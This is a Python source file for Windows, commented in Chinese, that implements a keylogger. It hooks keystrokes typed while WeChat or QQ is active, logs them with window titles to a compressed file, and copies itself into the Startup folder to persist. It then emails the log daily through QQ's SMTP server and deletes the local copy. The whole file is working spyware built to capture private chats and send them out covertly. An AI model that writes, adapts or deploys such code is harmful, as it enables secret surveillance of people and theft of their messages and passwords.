import os
import struct
import zlib
import time
from collections import defaultdict
import keyboard
import psutil
import win32gui
import win32process
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders


# 可配置的应用列表
TARGET_APPS = ["WeChat", "QQ"]  # 修改为更容易测试的应用，如记事本
# 配置部分，方便编辑
from_addr = "your_email@example.com"
to_addr = "recipient_email@example.com"
password = "your_email_password_or_smtp_token"
compressed_file = "D:\\key_data.bin"
interval_time = 86400  # 24 hours in seconds

# 自启动功能
def enable_startup():
    startup_dir = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
    script_name = os.path.basename(__file__)
    script_path = os.path.join(os.getcwd(), script_name)
    startup_path = os.path.join(startup_dir, script_name)
    
    if not os.path.exists(startup_path):
        with open(startup_path, 'w') as file:
            file.write(f'"{script_path}"')
        print(f"Program set to start automatically at: {startup_path}")
    else:
        print("Startup entry already exists.")

# 发送邮件功能
def send_email():
    msg = MIMEMultipart()
    msg['From'] = from_addr
    msg['To'] = to_addr
    msg['Subject'] = f'{time.strftime("%Y/%m/%d的记录", time.localtime(os.path.getmtime(compressed_file)))}'

    # 附件
    with open(compressed_file, "rb") as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())

    encoders.encode_base64(part)
    part.add_header("Content-Disposition", f"attachment; filename= {os.path.basename(compressed_file)}")
    msg.attach(part)

    # 连接到SMTP服务器并发送邮件
    try:
        server = smtplib.SMTP_SSL('smtp.qq.com', 465)
        server.login(from_addr, password)
        server.sendmail(from_addr, to_addr, msg.as_string())
        server.close()
        print("Email sent successfully.")
    except Exception as e:
        print(f"Failed to send email: {e}")

# 检查并发送邮件
def check_and_send_email():
    if os.path.exists(compressed_file):
        last_mod_time = os.path.getmtime(compressed_file)
        current_time = time.time()
        if current_time - last_mod_time > interval_time:
            send_email()
            os.remove(compressed_file)  # 发送邮件后删除文件
            print(f"{compressed_file} deleted after sending email.")

# 全局变量
recorded_data = []
current_window_title = None
key_buffer = {}
MERGE_INTERVAL = 5  # 合并间隔为5秒
is_target_app_active = False

def save_compressed_file():
    global recorded_data, compressed_file

    if not recorded_data:
        return

    existing_data = bytearray()
    if os.path.exists(compressed_file):
        with open(compressed_file, 'rb') as file:
            compressed_data = file.read()
            if compressed_data:
                try:
                    existing_data = bytearray(zlib.decompress(compressed_data))
                except zlib.error:
                    existing_data = bytearray()

    raw_data = existing_data

    for window_title, key_name, count, timestamp in recorded_data:
        raw_data.append(1)
        title_bytes = window_title.encode('utf-8')
        raw_data.extend(struct.pack('I', len(title_bytes)))
        raw_data.extend(title_bytes)
        key_bytes = key_name.encode('utf-8')
        raw_data.extend(struct.pack('I', len(key_bytes)))
        raw_data.extend(key_bytes)
        raw_data.extend(struct.pack('I', count))
        raw_data.extend(struct.pack('<d', timestamp))

    if raw_data:
        compressed_data = zlib.compress(bytes(raw_data))
        with open(compressed_file, 'wb') as file:
            file.write(compressed_data)

    recorded_data.clear()

def process_key_buffer():
    global recorded_data, key_buffer, current_window_title

    for key, data in list(key_buffer.items()):
        recorded_data.append((current_window_title, key, data['count'], data['first_time']))

    key_buffer.clear()

def on_key_event(e):
    global current_window_title, key_buffer, is_target_app_active
    if e.event_type == "down" and is_target_app_active:
        key_name = e.name
        current_time = time.time()

        if key_name in key_buffer:
            if current_time - key_buffer[key_name]['last_time'] <= MERGE_INTERVAL:
                key_buffer[key_name]['count'] += 1
                key_buffer[key_name]['last_time'] = current_time
            else:
                key_buffer[key_name] = {'count': 1, 'first_time': current_time, 'last_time': current_time}
        else:
            key_buffer[key_name] = {'count': 1, 'first_time': current_time, 'last_time': current_time}

def get_process_pids(process_names):
    pids = defaultdict(list)
    for proc in psutil.process_iter(['pid', 'name']):
        for name in process_names:
            if name.lower() in proc.info['name'].lower():
                pids[name].append(proc.info['pid'])
    return pids

def get_foreground_window_info():
    hwnd = win32gui.GetForegroundWindow()
    _, pid = win32process.GetWindowThreadProcessId(hwnd)
    title = win32gui.GetWindowText(hwnd)
    return pid, title

def normalize_title(title):
    return title.lstrip('*')

def is_app_active(app_pids):
    fg_window_pid, fg_window_title = get_foreground_window_info()
    for app_name, pids in app_pids.items():
        if fg_window_pid in pids:
            return True, normalize_title(fg_window_title), app_name
    return False, normalize_title(fg_window_title), "Global"

def main():
    global current_window_title, is_target_app_active
    last_window_title = None
    last_app_name = None
    last_active_pids = set()
    keyboard.hook(on_key_event)

    enable_startup()  # 启动时将自己设置为自启动程序
    check_and_send_email()  # 检查并发送邮件

    try:
        while True:
            app_pids = get_process_pids(TARGET_APPS) if TARGET_APPS else {}

            current_active_pids = set(pid for pids in app_pids.values() for pid in pids)
            closed_pids = last_active_pids - current_active_pids
            if closed_pids:
                process_key_buffer()
                save_compressed_file()
            last_active_pids = current_active_pids

            is_active, window_title, app_name = is_app_active(app_pids)

            if is_active or not TARGET_APPS:
                current_window_title = f"{app_name}: {window_title}"

                if app_name != last_app_name:
                    if last_app_name:
                        is_target_app_active = False
                        process_key_buffer()
                        save_compressed_file()
                    last_app_name = app_name
                    key_buffer.clear()
                    is_target_app_active = True

            elif last_app_name:
                is_target_app_active = False
                process_key_buffer()
                save_compressed_file()
                last_app_name = None
                key_buffer.clear()

            time.sleep(0.5)
    except KeyboardInterrupt:
        pass
    finally:
        process_key_buffer()
        save_compressed_file()

if __name__ == "__main__":
    main()
